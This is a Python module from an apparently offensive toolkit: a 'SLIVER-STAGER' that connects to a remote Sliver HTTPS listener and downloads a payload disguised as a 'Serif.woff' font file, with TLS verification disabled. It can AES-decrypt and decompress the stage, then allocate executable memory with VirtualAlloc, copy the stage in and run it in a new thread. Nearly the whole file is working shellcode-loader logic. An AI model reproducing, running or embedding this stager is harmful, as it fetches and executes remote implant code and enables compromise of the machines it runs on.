from utils.helper import nstate as nstate
from utils.helper import CheckFile, GetFileHash
from utils.windef import *
from time import sleep
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import requests
#import os
#import zlib

CATEGORY = 'stager'

def register_arguments(parser):
        parser.add_argument('-p', '--port', default=4444, type=int, required=True, help='Remote port to connect to')
        parser.add_argument('-r', '--remote-host', type=str, required=True, help='Remote host to connect to e.g. 192.168.2.1')
        grp = parser.add_argument_group('additional')
        grp.add_argument('-a', '--aes', default=0, action='store_true', required=False, help='AES decrypt the stage after download')
        grp.add_argument('-c', '--compression', default=0, action='store_true', required=False, help='Uncompress the stage after download')
        grp.add_argument('--headers', default=0, action='store_true', required=False, help='Print stage headers')
        grp.add_argument('-s', '--sleep', default=0, type=int, required=False, help='Sleep for x seconds before the stage is executed')
        grp2 = parser.add_argument_group('AES options')
        #parser.add_argument('-k', '--keygen', default=0, action='store_true', required=False, help='Generate AES key and iv')
        grp2.add_argument('-ak', '--aes-key', default='', type=str, required=False, help='Specify the AES key for decryption')
        grp2.add_argument('-ai', '--aes-iv', default='', type=str, required=False, help='Specify the AES IV for decryption')

class stage():
    
    Author = 'psycore8'
    Description = 'Connect to a Sliver HTTPS listener, download stage and execute'
    Version = '2.1.0'
    DisplayName = 'SLIVER-STAGER'
    payload_size = 0
    #sbuffer = bytearray
    header_16bytes = ''
    requests.packages.urllib3.disable_warnings() 
    #aes_key = b'ccuxGzZkf6NoThrhxq8NFPVhnE3Nlbun'
    #aes_iv = b'liowuFwnLZeW4zIN'
    #decomp = True

    #import base64
    import gzip

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'      : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'proc.sock'     : f'{nstate.s_note} Creating Socket...',
            'proc.con'      : f'{nstate.s_ok} Connection established',
            'proc.stage'    : f'{nstate.s_note} Download stage...',
            'proc.url'      : f'{nstate.s_note} Stage URL: https://{self.remote_host}:{self.remote_port}/Serif.woff',
            'proc.decomp'   : f'{nstate.s_note} decompressing data',
            'proc.decrypt'  : f'{nstate.s_note} decrypting data',
            'proc.stage_ok' : f'{nstate.s_ok} Stage downloaded! Size: {self.payload_size} bytes',
            'proc.exec'     : f'{nstate.s_note} Trying to execute Meterpreter stage...',
            'proc.pos'      : f'{nstate.s_note} Trying to find payload position...',
            'proc.buf'      : f'{nstate.s_note} Payload found!',
            'proc.header'   : f'{nstate.s_note} Printing size and 16 bytes of header:\n{nstate.f_out} Size: {self.payload_size}\n{nstate.f_out} {self.header_16bytes}',
            'inj.alloc'     : f'{nstate.s_note} Memory allocated!',
            'inj.sleep'     : f'{nstate.s_info} Let\'s take a nap for {self.sleeptime} seconds',
            'inj.exec'      : f'{nstate.s_ok} Thread created, execute the payload',
            'inj.ok'        : f'{nstate.s_note} Buffer prepared!',
            'inj.fail'      : f'{nstate.s_fail} Payload not executed',
            'post.done'     : f'{nstate.s_ok} DONE!',
            'error.alloc'   : f'{nstate.s_fail} Error allocating memory',
            'error.con'     : f'{nstate.s_fail} Connection failed',
            'error.stage_ok': f'{nstate.s_fail} Error during download',
            'error.buf'     : f'{nstate.s_fail} Buffer not valid',
            'error.inj'     : f'{nstate.s_fail} Thread not created, exiting'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def __init__(self, remote_host=str, remote_port=int, sleeptime=int, aes=False, aes_key='', aes_iv='', compression=False, headers=False):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.sleeptime = sleeptime
        self.compression = compression
        self.headers = headers
        self.aes = aes
        if aes:
             self.aes_key = aes_key
             self.aes_iv = aes_iv

    def aes_decrypt(self, data):
        cipher = Cipher(algorithms.AES(self.aes_key.encode('utf-8')), modes.CBC(self.aes_iv.encode('utf-8')), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(data) + decryptor.finalize()
        def unpad(data):
            pad_length = data[-1] 
            return data[:-pad_length]
        decrypted_data = unpad(decrypted_padded)
        return decrypted_data
    
    def decompress(self, data):
        return self.gzip.decompress(data) 
    
    def ph(self, header, size):
         self.header_16bytes = ' '.join(f'{byte:02X}' for byte in header)
         self.payload_size = size
         self.msg('proc.header')

    def process(self):
        self.msg('pre.head')
        static_url = f'https://{self.remote_host}:{self.remote_port}/Serif.woff'
        try:
            self.msg('proc.stage')
            response = requests.get(static_url, stream=True, verify=False)
            self.msg('proc.url')
            response.raise_for_status()
            stage_data = response.content
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
            self.msg('proc.stage')
        except requests.exceptions.RequestException as e:
            self.msg('error.stage_ok')

        if self.aes:
            self.msg('proc.decrypt')
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
            stage_data = self.aes_decrypt(stage_data[16:])
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
        if self.compression:
            self.msg('proc.decomp')
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
            stage_data = self.decompress(stage_data)
            if self.headers: self.ph(stage_data[0:16], len(stage_data))

        self.payload_size = len(stage_data)
        self.msg('proc.stage_ok')
        #stage_start = stage_data.find(b'\x00')

        stage_buffer = stage_data
        #self.sbuffer = stage_buffer[0:8]
        self.msg('proc.buf')
        ptr = VirtualAlloc(0, len(stage_buffer), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if ptr:
             self.msg('inj.alloc')
        else:
             self.msg('error.alloc', True)
        RtlMoveMemory(ptr, stage_buffer, len(stage_buffer))
        if self.sleeptime > 0:
            self.msg('inj.sleep')
            sleep(self.sleeptime)

        ht = CreateThread(None, 0, ptr, None, 0, None)
        if ht:
                self.msg('inj.exec')
        else:
                self.msg('error.inj')
        WaitForSingleObject(ht, -1)


    